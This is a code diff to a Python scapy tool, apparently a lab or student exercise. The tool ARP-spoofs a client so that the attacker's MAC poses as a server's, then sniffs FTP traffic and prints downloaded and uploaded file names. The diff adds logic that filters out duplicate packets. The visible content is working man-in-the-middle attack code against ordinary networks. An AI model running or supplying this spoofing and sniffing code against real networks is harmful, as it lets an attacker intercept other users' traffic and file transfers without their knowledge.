@@ -2,9 +2,16 @@ from scapy.all import ARP, sniff, send
 import threading
 import time
 import argparse
-import sys
 
 stop_event = threading.Event()
+package = {}
+
+def clear_pakage():
+    curent_time = time.time()
+    for key in list(package):
+        if curent_time - package[key] > 0.1:
+            del package[key]
+    
 
 def arp_spoof(client_ip, client_mac, server_ip, server_mac):
     arp_response = ARP(pdst=client_ip, hwdst=client_mac, psrc=server_ip, op='is-at')  # Replacer l'adresse MAC du serveur par celle de l'attaquant
@@ -16,16 +23,20 @@ def arp_spoof(client_ip, client_mac, server_ip, server_mac):
         time.sleep(1)
 
 def capture_ftp_traffic(pkt, verbose):
+    clear_pakage()
     if pkt.haslayer('TCP'):
         if pkt['TCP'].dport == 21 or pkt['TCP'].sport == 21:
             if pkt.haslayer('Raw'):
                 data = pkt['Raw'].load.decode(errors='ignore')
-                if verbose:
-                    print(data)
-                elif data.startswith('RETR'):
+                if (data in package):
+                    return
+                if data.startswith('RETR'):
                     print("File download = " + data.split()[1])
                 elif data.startswith('STOR'):
                     print("File upload = " + data.split()[1])
+                elif verbose:
+                    print(data)
+                package[data] = time.time()
 
 def main():
 
